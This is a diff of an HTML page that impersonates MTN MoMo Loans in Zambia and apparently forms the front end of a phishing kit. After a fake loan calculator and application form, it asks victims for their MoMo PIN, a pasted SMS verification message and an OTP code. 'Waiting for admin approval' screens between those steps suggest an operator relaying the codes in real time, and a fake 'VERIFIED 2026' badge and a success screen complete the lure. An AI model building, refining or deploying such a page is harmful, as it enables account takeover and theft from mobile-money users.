@@ -3,134 +3,501 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>MTN MoMo Zambia Loans</title>
-  <link rel="stylesheet" href="style.css">
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <title>MTN MoMo Loans</title>
+  <style>
+    :root {
+      --primary-color: #004F9F;
+      --secondary-color: #FFCC00;
+      --bg-color: #F4F5F7;
+      --card-bg: #FFFFFF;
+      --text-main: #1A1A1A;
+      --text-muted: #666666;
+    }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: var(--bg-color);
+      color: var(--text-main);
+      margin: 0;
+      padding: 0;
+    }
+    header {
+      background-color: #002D5A;
+      color: white;
+      padding: 12px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .logo-container {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .logo-badge {
+      background-color: var(--secondary-color);
+      color: #000;
+      font-weight: 800;
+      padding: 4px 10px;
+      border-radius: 4px;
+      font-size: 18px;
+      letter-spacing: -1px;
+    }
+    .container {
+      max-width: 480px;
+      margin: 20px auto;
+      background: var(--card-bg);
+      border-radius: 12px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+      padding: 24px;
+      box-sizing: border-box;
+    }
+    .screen { display: none; }
+    .screen.active { display: block; }
+    
+    h2 { font-size: 22px; text-align: center; margin-bottom: 6px; color: #111; }
+    p.subtitle { text-align: center; color: var(--text-muted); font-size: 14px; margin-bottom: 24px; }
+    
+    .calc-box {
+      background: #FAFAFC;
+      border: 1px solid #EAEAEA;
+      border-radius: 8px;
+      padding: 16px;
+      margin-bottom: 20px;
+    }
+    .calc-row {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 12px;
+      font-size: 14px;
+    }
+    .calc-row span:last-child {
+      font-weight: bold;
+      color: #D4AF37;
+    }
+    input[type="range"] {
+      width: 100%;
+      accent-color: var(--secondary-color);
+      margin: 10px 0 15px 0;
+    }
+    .monthly-payment-box {
+      background: #FFF;
+      border: 1px solid #EAEAEA;
+      padding: 12px;
+      border-radius: 6px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .monthly-payment-box span:last-child {
+      font-size: 20px;
+      font-weight: 800;
+      color: #D4AF37;
+    }
+
+    .btn-primary {
+      background-color: var(--primary-color);
+      color: white;
+      border: none;
+      width: 100%;
+      padding: 14px;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      text-align: center;
+    }
+    .btn-secondary {
+      background-color: #E2E2E2;
+      color: #333;
+      border: none;
+      width: 48%;
+      padding: 14px;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+    .btn-group {
+      display: flex;
+      justify-content: space-between;
+      gap: 10px;
+      margin-top: 20px;
+    }
+
+    /* Steps indicator */
+    .steps-indicator {
+      display: flex;
+      gap: 6px;
+      margin-bottom: 24px;
+    }
+    .step-line {
+      flex: 1;
+      height: 4px;
+      background: #E2E2E2;
+      border-radius: 2px;
+    }
+    .step-line.active {
+      background: var(--secondary-color);
+    }
+
+    .form-group {
+      margin-bottom: 16px;
+    }
+    label {
+      display: block;
+      font-size: 13px;
+      font-weight: 600;
+      margin-bottom: 6px;
+      color: #333;
+    }
+    input, select, textarea {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #D0D5DD;
+      border-radius: 6px;
+      font-size: 14px;
+      box-sizing: border-box;
+      background: #FFF;
+    }
+    .phone-input-group {
+      display: flex;
+      border: 1px solid #D0D5DD;
+      border-radius: 6px;
+      overflow: hidden;
+    }
+    .phone-prefix {
+      background: #F4F5F7;
+      padding: 12px;
+      font-weight: 600;
+      color: #555;
+      border-right: 1px solid #D0D5DD;
+    }
+    .phone-input-group input {
+      border: none;
+      border-radius: 0;
+    }
+
+    /* Pin / OTP Inputs */
+    .pin-boxes {
+      display: flex;
+      justify-content: space-between;
+      gap: 8px;
+      margin: 15px 0;
+    }
+    .pin-box {
+      width: 45px;
+      height: 48px;
+      text-align: center;
+      font-size: 20px;
+      border: 1px solid #D0D5DD;
+      border-radius: 6px;
+    }
+
+    /* Loading / Waiting Fullscreen */
+    .waiting-screen {
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: var(--primary-color);
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+      display: none;
+      padding: 20px;
+      text-align: center;
+    }
+    .waiting-spinner {
+      font-size: 48px;
+      margin-bottom: 20px;
+      animation: pulse 1.5s infinite;
+    }
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.1); }
+      100% { transform: scale(1); }
+    }
+    .progress-bar-container {
+      width: 80%;
+      max-width: 300px;
+      height: 6px;
+      background: rgba(255,255,255,0.2);
+      border-radius: 3px;
+      margin-top: 20px;
+      overflow: hidden;
+    }
+    .progress-bar-fill {
+      width: 50%;
+      height: 100%;
+      background: var(--secondary-color);
+      animation: indeterminate 1.5s infinite linear;
+    }
+    @keyframes indeterminate {
+      0% { transform: translateX(-100%); }
+      100% { transform: translateX(200%); }
+    }
+  </style>
 </head>
 <body>
 
-  <div class="portal-container">
-    <!-- Header -->
-    <div class="portal-header">
-      <div class="brand-badge">
-        <span class="momo-logo-text">MTN <b>MoMo</b> Loans</span>
-        <span class="verified-tag">✓ VERIFIED 2026</span>
+  <header>
+    <div class="logo-container">
+      <div class="logo-badge">MM</div>
+      <span style="font-weight: 600; font-size: 15px;">Loans</span>
+    </div>
+    <span style="font-size: 13px; color: #FFCC00;">from MTN</span>
+  </header>
+
+  <!-- SCREEN 1: Welcome & Loan Calculator -->
+  <div id="screen-welcome" class="container screen active">
+    <h2>Welcome to MTN MoMo</h2>
+    <p class="subtitle">Get loans easily through MTN MoMo</p>
+    
+    <div class="calc-box">
+      <div class="calc-row">
+        <span>Amount</span>
+        <span id="calc-display-amount">ZMW 1,000,000</span>
+      </div>
+      <div class="calc-row">
+        <span>Term</span>
+        <span>48 Months</span>
+      </div>
+      <input type="range" id="loan-range" min="500000" max="5000000" step="100000" value="1000000">
+      <div style="display: flex; justify-content: space-between; font-size: 11px; color: var(--text-muted);">
+        <span>ZMW 500,000</span>
+        <span>ZMW 5,000,000</span>
+      </div>
+      <div class="monthly-payment-box" style="margin-top: 15px;">
+        <span style="font-size: 14px; color: #555;">Monthly Payment</span>
+        <span id="calc-monthly-payment">ZMW 20,834</span>
       </div>
     </div>
 
-    <!-- Step 0: Welcome -->
-    <div id="step-welcome" class="card text-center">
-      <h2>Quick Mobile Loans</h2>
-      <p class="subtitle">Instant ZMW cash direct to your MTN Mobile Money wallet.</p>
-      <button id="start-loan-btn" class="btn-primary">Apply Now</button>
+    <button class="btn-primary" onclick="goToStep(1)">START APPLICATION</button>
+  </div>
+
+  <!-- SCREEN 2: Loan Application Step 1 of 3 -->
+  <div id="screen-step1" class="container screen">
+    <h2>Loan Application</h2>
+    <p class="subtitle">Step 1 of 3</p>
+    <div class="steps-indicator">
+      <div class="step-line active"></div>
+      <div class="step-line"></div>
+      <div class="step-line"></div>
     </div>
 
-    <!-- Step 1: Loan Calculator -->
-    <div id="step-loan" class="card" style="display: none;">
-      <div class="horizontal-steps">
-        <div class="step-line active"></div>
-        <div class="step-line"></div>
-        <div class="step-line"></div>
+    <div class="form-group">
+      <label>Loan Type</label>
+      <select id="loan-type">
+        <option>Business Loan</option>
+        <option>Personal Loan</option>
+        <option>Emergency Loan</option>
+      </select>
+    </div>
+    <div class="form-group">
+      <label>Loan Amount (ZMW)</label>
+      <input type="number" id="input-amount" value="1000000">
+    </div>
+    <div class="form-group">
+      <label>Loan Term</label>
+      <select id="loan-term">
+        <option>48 Months</option>
+        <option>24 Months</option>
+        <option>12 Months</option>
+      </select>
+    </div>
+    <div class="form-group">
+      <label>Purpose of Loan</label>
+      <textarea id="loan-purpose" rows="3" placeholder="Describe the purpose of your loan..."></textarea>
+    </div>
+
+    <button class="btn-primary" onclick="goToStep(2)">NEXT STEP</button>
+  </div>
+
+  <!-- SCREEN 3: Loan Application Step 2 of 3 -->
+  <div id="screen-step2" class="container screen">
+    <h2>Loan Application</h2>
+    <p class="subtitle">Step 2 of 3</p>
+    <div class="steps-indicator">
+      <div class="step-line active"></div>
+      <div class="step-line active"></div>
+      <div class="step-line"></div>
+    </div>
+
+    <div style="display: flex; gap: 10px;">
+      <div class="form-group" style="flex: 1;">
+        <label>First Name</label>
+        <input type="text" id="first-name" placeholder="First Name">
       </div>
-      <p class="step-counter-text">Step 1 of 3: Select Amount</p>
-      
-      <h2>Choose Loan Amount</h2>
-      <div class="calculator-box">
-        <div class="calc-row">
-          <span>Requested Amount:</span>
-          <span id="loan-amount-display" class="highlight-yellow">ZMW 2,500</span>
-        </div>
-        <div class="slider-group">
-          <input type="range" id="loan-amount-range" min="500" max="10000" step="100" value="2500">
-          <div class="slider-limits"><span>ZMW 500</span><span>ZMW 10,000</span></div>
-        </div>
-        <div class="calc-row monthly-row">
-          <span>Est. Monthly Repayment:</span>
-          <span id="monthly-repay-display" class="monthly-val">ZMW 958</span>
-        </div>
+      <div class="form-group" style="flex: 1;">
+        <label>Last Name</label>
+        <input type="text" id="last-name" placeholder="Last Name">
       </div>
-      <button id="proceed-personal-btn" class="btn-primary">Continue</button>
     </div>
-
-    <!-- Step 2: Personal & Employment Details -->
-    <div id="step-personal" class="card" style="display: none;">
-      <div class="horizontal-steps">
-        <div class="step-line active"></div>
-        <div class="step-line active"></div>
-        <div class="step-line"></div>
+    <div class="form-group">
+      <label>Phone Number (Zambia)</label>
+      <div class="phone-input-group">
+        <div class="phone-prefix">+260</div>
+        <input type="tel" id="phone-number" placeholder="967123456">
       </div>
-      <p class="step-counter-text">Step 2 of 3: Personal Details</p>
-
-      <form id="personal-form">
-        <div class="input-group">
-          <label>Full Name (as per NRC)</label>
-          <input type="text" id="fullname" required placeholder="John Mwansa">
-        </div>
-        <div class="input-group">
-          <label>MTN MoMo Phone Number</label>
-          <div class="phone-input-container">
-            <span class="prefix-box">+260</span>
-            <input type="tel" id="phone" required placeholder="96xxxxxxx" maxlength="9">
-          </div>
-        </div>
-        <div class="input-group">
-          <label>Employment Status</label>
-          <select id="employment" required>
-            <option value="">Select status</option>
-            <option value="employed">Employed</option>
-            <option value="self-employed">Self-Employed</option>
-            <option value="business">Business Owner</option>
-          </select>
-        </div>
-        <button type="submit" class="btn-primary">Verify Account</button>
-      </form>
+      <span style="font-size: 11px; color: #777; margin-top: 4px; display: block;">10 digits without +260 prefix (e.g., 967123456)</span>
     </div>
 
-    <!-- Step 3: PIN Auth Screen -->
-    <div id="step-auth" class="card login-header text-center" style="display: none;">
-      <div class="momo-logo-large">MoMo</div>
-      <h2>Enter MoMo PIN</h2>
-      <p class="pin-label">Confirm transaction PIN for disbursement</p>
-      
-      <div class="pin-dots">
-        <input type="password" class="dot pin-digit" maxlength="1" pattern="[0-9]*" inputmode="numeric">
-        <input type="password" class="dot pin-digit" maxlength="1" pattern="[0-9]*" inputmode="numeric">
-        <input type="password" class="dot pin-digit" maxlength="1" pattern="[0-9]*" inputmode="numeric">
-        <input type="password" class="dot pin-digit" maxlength="1" pattern="[0-9]*" inputmode="numeric">
+    <div class="btn-group">
+      <button class="btn-secondary" onclick="goToStep(1)">BACK</button>
+      <button class="btn-primary" style="width: 48%;" onclick="goToStep(3)">NEXT STEP</button>
+    </div>
+  </div>
+
+  <!-- SCREEN 4: Loan Application Step 3 of 3 -->
+  <div id="screen-step3" class="container screen">
+    <h2>Loan Application</h2>
+    <p class="subtitle">Step 3 of 3</p>
+    <div class="steps-indicator">
+      <div class="step-line active"></div>
+      <div class="step-line active"></div>
+      <div class="step-line active"></div>
+    </div>
+
+    <div class="form-group">
+      <label>Employment Status</label>
+      <select id="employment-status">
+        <option>Self-employed</option>
+        <option>Employed</option>
+        <option>Business Owner</option>
+      </select>
+    </div>
+    <div class="form-group">
+      <label>Annual Income (ZMW)</label>
+      <input type="number" id="annual-income" placeholder="Enter annual income">
+    </div>
+
+    <div class="calc-box" style="background: #FAFAFC;">
+      <div style="font-weight: bold; margin-bottom: 8px; font-size: 13px;">Application Summary</div>
+      <div class="calc-row"><span>Loan Amount:</span> <span id="summary-amount">ZMW 1,000,000</span></div>
+      <div class="calc-row"><span>Loan Term:</span> <span id="summary-term">48 Months</span></div>
+      <div class="calc-row"><span>Purpose:</span> <span id="summary-purpose">-</span></div>
+      <div class="calc-row"><span>Applicant:</span> <span id="summary-applicant">-</span></div>
+    </div>
+
+    <div class="btn-group">
+      <button class="btn-secondary" onclick="goToStep(2)">BACK</button>
+      <button class="btn-primary" style="width: 48%; background-color: #002D5A;" onclick="submitApplication()">SUBMIT APPLICATION</button>
+    </div>
+  </div>
+
+  <!-- SCREEN 5: Login to MTN MoMo (PIN Input) -->
+  <div id="screen-login" class="container screen">
+    <div style="text-align: center; margin-bottom: 15px;">
+      <div class="logo-badge" style="display: inline-block; font-size: 22px; padding: 6px 14px;">MM</div>
+      <div style="font-weight: bold; font-size: 16px; margin-top: 5px;">MoMo</div>
+      <div style="font-size: 12px; color: #666;">Login via MTN MoMo</div>
+    </div>
+    <h2>Login to MTN MoMo</h2>
+    <div class="phone-input-group" style="margin: 15px 0;">
+      <div class="phone-prefix">+260</div>
+      <input type="tel" id="login-phone" readonly style="background: #F4F5F7;">
+    </div>
+    <label style="text-align: center; margin: 15px 0 5px 0; color: #555;">Enter your MoMo PIN (5 digits):</label>
+    
+    <div class="pin-boxes">
+      <input type="password" maxlength="1" class="pin-box p-pin" autofocus>
+      <input type="password" maxlength="1" class="pin-box p-pin">
+      <input type="password" maxlength="1" class="pin-box p-pin">
+      <input type="password" maxlength="1" class="pin-box p-pin">
+      <input type="password" maxlength="1" class="pin-box p-pin">
+    </div>
+
+    <button class="btn-primary" id="btn-login-momo" onclick="submitPinLogin()" style="margin-top: 15px; background: #E2E2E2; color: #888;" disabled>LOGIN</button>
+  </div>
+
+  <!-- SCREEN 6: Waiting for Admin Approval (After PIN) -->
+  <div id="screen-waiting-admin" class="waiting-screen">
+    <div class="waiting-spinner">⌛</div>
+    <h2 style="color: white; margin-bottom: 8px;">Waiting for Admin Approval</h2>
+    <p style="color: rgba(255,255,255,0.8); font-size: 14px; margin-bottom: 15px;">Your login is pending admin verification. Please wait...</p>
+    <div class="progress-bar-container"><div class="progress-bar-fill"></div></div>
+    <div style="margin-top: 25px; font-size: 13px; color: #FFCC00;" id="display-app-id">Application ID: APP-12345678</div>
+  </div>
+
+  <!-- SCREEN 7: SMS Verification Paste Screen -->
+  <div id="screen-sms" class="container screen">
+    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
+      <span style="font-weight: bold; font-size: 15px;">MTN MoMo Loans</span>
+      <span style="background: #FFCC00; color: #000; font-size: 11px; font-weight: bold; padding: 3px 8px; border-radius: 4px;">✓ VERIFIED 2026</span>
+    </div>
+    <div style="font-size: 14px; color: #555; margin-bottom: 12px;">SMS Verification</div>
+    <h2>Paste SMS Message</h2>
+    <p style="font-size: 13px; color: #666; text-align: left; margin-bottom: 15px;">A verification message has been sent to your phone. Please copy and paste the full message here.</p>
+
+    <div style="background: #FFFDF0; border: 1px solid #FDF0C0; padding: 12px; border-radius: 6px; margin-bottom: 15px; display: flex; gap: 10px; align-items: center;">
+      <span style="font-size: 24px;">⏳</span>
+      <div>
+        <div style="font-weight: bold; font-size: 13px; color: #8F6B00;" id="timer-display">Message expires in 55s.</div>
+        <div style="font-size: 12px; color: #888;">Paste your SMS before time runs out.</div>
       </div>
-
-      <button id="submit-pin-btn" class="btn-primary">Authorize Loan</button>
     </div>
 
-    <!-- Step 4: Waiting Screen (Admin Review) -->
-    <div id="step-waiting" class="admin-waiting-screen" style="display: none;">
-      <div class="spinner-icon">⏳</div>
-      <h2>Verifying MoMo PIN</h2>
-      <p>Checking PIN status with administrator...</p>
-      
-      <div class="progress-bar-container">
-        <div class="animated-progress-bar">Admin is reviewing your PIN...</div>
-      </div>
-      <div class="app-id-display">Application ID: <span id="app-id-text" class="highlight-yellow"></span></div>
+    <div class="form-group">
+      <textarea id="sms-text-input" rows="4" placeholder="Paste your full SMS message here..."></textarea>
+      <span style="font-size: 11px; color: #777; margin-top: 4px; display: block;">Example: "Your MTN MoMo verification code is: 123456"</span>
     </div>
 
-    <!-- Step 5: SMS Verification Placeholder -->
-    <div id="step-sms" class="card text-center" style="display: none;">
-      <h2>SMS Verification</h2>
-      <p class="subtitle">Paste recent message confirmation if requested.</p>
+    <button class="btn-primary" onclick="submitSmsVerification()" style="background: #98A2B3;">SUBMIT</button>
+  </div>
+
+  <!-- SCREEN 8: Waiting for SMS Approval -->
+  <div id="screen-waiting-sms" class="waiting-screen">
+    <div class="waiting-spinner">⌛</div>
+    <h2 style="color: white; margin-bottom: 8px;">Verifying SMS Message</h2>
+    <p style="color: rgba(255,255,255,0.8); font-size: 14px; margin-bottom: 15px;">Your SMS message has been received. Please wait for admin verification...</p>
+    <div class="progress-bar-container"><div class="progress-bar-fill"></div></div>
+    <div style="margin-top: 25px; font-size: 13px; color: #FFCC00;" id="display-app-id-sms">Application ID: APP-12345678</div>
+  </div>
+
+  <!-- SCREEN 9: OTP Verification Screen -->
+  <div id="screen-otp" class="container screen">
+    <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 15px;">
+      <span style="cursor: pointer; color: var(--primary-color);" onclick="history.back()">← Back</span>
+      <span style="font-weight: bold; color: var(--primary-color);">OTP Verification</span>
+      <span></span>
+    </div>
+    <h2>Enter OTP Code</h2>
+    <p class="subtitle" style="margin-bottom: 15px;">Enter the 4-digit OTP code sent to your phone via MTN MoMo</p>
+    <label style="color: var(--primary-color);">OTP Code (4 digits):</label>
+
+    <div class="pin-boxes" style="max-width: 280px; margin: 15px auto;">
+      <input type="password" maxlength="1" class="pin-box p-otp" autofocus>
+      <input type="password" maxlength="1" class="pin-box p-otp">
+      <input type="password" maxlength="1" class="pin-box p-otp">
+      <input type="password" maxlength="1" class="pin-box p-otp">
     </div>
 
-    <!-- Step 6: Success Screen -->
-    <div id="step-success" class="card success-card text-center" style="display: none;">
-      <div class="success-icon">✓</div>
-      <h2>Loan Approved!</h2>
-      <p class="subtitle">Funds have been dispatched to your MTN MoMo wallet.</p>
-      <div class="badge-verified-box">Disbursement Complete</div>
-    </div>
+    <button class="btn-primary" id="btn-verify-otp" onclick="submitOtpCode()" style="background: #E2E2E2; color: #888; margin-top: 20px;" disabled>VERIFY & APPROVE LOAN</button>
+  </div>
 
+  <!-- SCREEN 10: Waiting for OTP Approval -->
+  <div id="screen-waiting-otp" class="waiting-screen">
+    <div class="waiting-spinner">⌛</div>
+    <h2 style="color: white; margin-bottom: 8px;">Verifying OTP Code</h2>
+    <p style="color: rgba(255,255,255,0.8); font-size: 14px; margin-bottom: 15px;">Your OTP code has been received. Please wait for admin verification...</p>
+    <div class="progress-bar-container"><div class="progress-bar-fill"></div></div>
+    <div style="margin-top: 25px; font-size: 13px; color: #FFCC00;" id="display-app-id-otp">Application ID: APP-12345678</div>
+  </div>
+
+  <!-- SCREEN 11: Final Success Screen -->
+  <div id="screen-success" class="container screen" style="text-align: center; padding: 40px 20px;">
+    <div style="font-size: 60px; margin-bottom: 15px;">🎉</div>
+    <h2 style="color: #004F9F;">Loan Approved Successfully!</h2>
+    <p class="subtitle">Your funds have been disbursed to your MTN MoMo account.</p>
+    <div style="background: #F4F5F7; padding: 15px; border-radius: 8px; margin: 20px 0; font-weight: bold; color: #333;" id="final-success-id">
+      Application ID: APP-000000000
+    </div>
+    <button class="btn-primary" onclick="location.reload()">DONE</button>
   </div>
 
   <script src="script.js"></script>
 </body>
-  </html>
-            
+                      </html>
+  
